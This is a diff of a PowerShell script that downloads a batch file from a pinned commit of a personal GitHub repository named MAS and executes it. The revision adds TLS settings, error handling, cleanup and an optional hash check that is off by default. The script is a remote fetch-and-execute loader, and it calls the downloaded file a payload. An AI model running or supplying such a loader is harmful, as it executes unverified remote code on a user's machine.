@@ -1,9 +1,65 @@
-# 1. Target the raw file content rather than the web preview
-$url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat"
-$destination = Join-Path -Path $env:TEMP -ChildPath "main.bat"
+[CmdletBinding()]
+param (
+    [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",
+    [string]$ExpectedSha256 = "" # Optional: specify expected hash to enforce strict integrity
+)
 
-# 2. Download the raw batch script
-Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
+# 1. Enforce modern TLS protocols for GitHub endpoints
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# 3. Launch the batch file in a new console window
-Start-Process -FilePath $destination
+# 2. Establish a unique temporary file path to prevent collision
+$uniqueName = "script_{0}.bat" -f [System.Guid]::NewGuid().ToString("N")
+$destination = Join-Path -Path $env:TEMP -ChildPath $uniqueName
+
+try {
+    Write-Verbose "Downloading payload from $Url..."
+
+    # Download with strict error propagation and modern parsing bypass
+    $webParams = @{
+        Uri             = $Url
+        OutFile         = $destination
+        UseBasicParsing = $true
+        ErrorAction     = 'Stop'
+        TimeoutSec      = 30
+    }
+    Invoke-WebRequest @webParams
+
+    # 3. Validate file existence and minimum payload threshold
+    if (-not (Test-Path -LiteralPath $destination)) {
+        throw "Target destination path was not created."
+    }
+
+    $fileInfo = Get-Item -LiteralPath $destination
+    if ($fileInfo.Length -eq 0) {
+        throw "Downloaded payload is empty (0 bytes)."
+    }
+
+    # 4. Optional Cryptographic Hash Verification
+    if (-not [string]::IsNullOrWhiteSpace($ExpectedSha256)) {
+        $actualHash = (Get-FileHash -LiteralPath $destination -Algorithm SHA256).Hash
+        if ($actualHash -ne $ExpectedSha256.ToUpperInvariant()) {
+            throw "Hash mismatch! Expected: $ExpectedSha256, Actual: $actualHash"
+        }
+    }
+
+    Write-Verbose "Executing payload synchronously: $destination"
+
+    # 5. Launch synchronously and track exit code
+    $proc = Start-Process -FilePath $destination -Wait -PassThru
+
+    if ($proc.ExitCode -ne 0) {
+        Write-Warning "Process completed with non-zero exit code: $($proc.ExitCode)"
+    } else {
+        Write-Verbose "Execution completed successfully."
+    }
+}
+catch {
+    Write-Error "Script execution failed: $($_.Exception.Message)"
+}
+finally {
+    # 6. Secure cleanup of temporary artifacts
+    if (Test-Path -LiteralPath $destination) {
+        Remove-Item -LiteralPath $destination -Force -ErrorAction SilentlyContinue
+        Write-Verbose "Temporary artifact removed: $destination"
+    }
+}
